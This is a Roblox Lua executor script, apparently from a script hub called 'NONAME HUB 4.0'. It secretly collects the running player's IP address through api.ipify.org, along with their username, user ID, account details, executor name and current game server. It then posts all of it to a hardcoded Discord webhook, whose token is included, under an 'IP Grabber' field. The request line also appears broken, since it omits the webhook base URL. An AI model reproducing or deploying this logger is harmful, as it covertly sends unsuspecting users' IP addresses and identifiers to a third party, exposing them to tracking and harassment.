local Url = "https://discord.com/api/webhooks/"
local Webhook = "1112700346943422565/-pEmsXwqjNKsiRZixg85TJBMvUdcLvNTgIApfa6Sm_RsdnezT5HBXg9fcP56tYt2Xmfb"
local plrname = game.Players.LocalPlayer.Name
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
Parent = game.Workspace
local Day = game.Players.LocalPlayer.AccountAge
local MaxPlr = game.Players.MaxPlayers
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local ExecuteR = identifyexecutor()
local JobIDG = game.JobId
local UserIDs = game.Players.LocalPlayer.UserId
local DisPlayN = game.Players.LocalPlayer.DisplayName
local player = game:GetService"Players".LocalPlayer
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
   premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
   alt = false
end
local GPID = game.PlaceId
local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local players = game.Players:GetPlayers()
local PlayerData =
{
       ["content"] = "@everyone **Someone Run The Script**",
       ["embeds"] = {
           {
           ["title"] = "NONAME HUB 4.0",
           ["description"] = "**Check Players**",
           ["color"] = tonumber(0x00FF00),
           ["thumbnail"] = {
            ["url"] = AvatarImage,
        },
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = "**"..plrname.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = "**"..DisPlayN.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Player ID",
                ["value"] = "**["..UserIDs.."](" .. tostring("https://www.roblox.com/users/" .. UserIDs .. "/profile")..")**",
                ["inline"] = true
            },
            {
                ["name"] = "Execute is",
                ["value"] = "**"..executor.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Game Job Id",
                ["value"] = "**"..JobIDG.."**",
                ["inline"] = true
            },
            {
                ["name"] = "IP Grabber",
                ["value"] = "**["..ip.."](" .. tostring("https://checkip.thaiware.com/?ip=" .. ip) .. ")**",
                ["inline"] = true
            },
            {
                ["name"] = "Game Place Id",
                ["value"] = "**["..GPID.."](" .. tostring("https://www.roblox.com/games/".. GPID) .. ")**",
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = "**"..GameName.."**",
                ["inline"] = true
            },
            {
                ["name"] = "Max Player",
                ["value"] = "**"..#players.."**/" .. "**"..MaxPlr.."**",
                ["inline"] = true
            },
        },
           ["type"] = "rich",
           ["author"] = {
                   ["name"] = "Roblox Map";
                   ["url"] = 'https://www.roblox.com/games/'..GPID,
                        },
           ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
        }
    }
}


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request(
    {
        Url = Webhook, 
        Body = PlayerData, 
        Method = "POST", 
        Headers = {["content-type"] = "application/json"} 
    }
)
